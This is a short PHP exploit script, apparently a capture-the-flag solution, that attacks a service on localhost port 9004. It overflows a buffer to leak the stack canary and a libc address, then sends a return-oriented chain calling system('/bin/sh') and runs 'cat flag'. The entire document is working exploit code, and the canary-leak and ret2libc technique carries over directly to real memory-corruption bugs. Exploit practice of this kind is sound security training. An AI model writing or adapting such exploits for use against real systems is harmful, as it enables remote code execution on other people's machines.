#!/usr/bin/php
<?php
const POPRDI = 0x000152BC;
const BINSH  = 0x00088F50;
const SYSTEM = 0x0003DB62;

$socket = fsockopen("127.0.0.1", 9004);

printf("[*] Leak canary\n");
$size = 0x50 - 8;
fwrite($socket, str_repeat("A", $size) . "\n");
fread($socket, $size);
$leak   = fgets($socket);
$canary = substr($leak, 0, 8);

if(strlen($canary) !== 8)
	return fprintf(STDERR, "[-] Could not leak canary\n");

printf("Canary: %s\n", bin2hex($canary));


printf("[*] Leak libc\n");
$size = 0x50 + 8;
fwrite($socket, str_repeat("A", $size) . "\n");
fread($socket, $size);
$leak = substr(fgets($socket), 0, -1);
$leak = str_pad($leak, 8, "\x00");
$addr = unpack("Q", $leak)[1];
$libc = $addr - 0x6EFDCD3EF229 + 0x6EFDCD3D3000;

printf("libc: %X\n", $libc);


printf("[*] Send payload\n");
$payload  = str_repeat("A", 0x50 - 8);
$payload .= $canary;
$payload .= pack("Q", 0xDEADBEEF); // nobody cares about rbp
$payload .= pack("Q*", 
	$libc + POPRDI,
	$libc + BINSH,
	$libc + SYSTEM,
);

fwrite($socket, $payload . "\n");
fgets($socket);


printf("[*] Execute ROP chain\n");
fwrite($socket, "\n");

printf("[*] Send commands\n");
fwrite($socket, "cat flag\n");
echo fgets($socket);
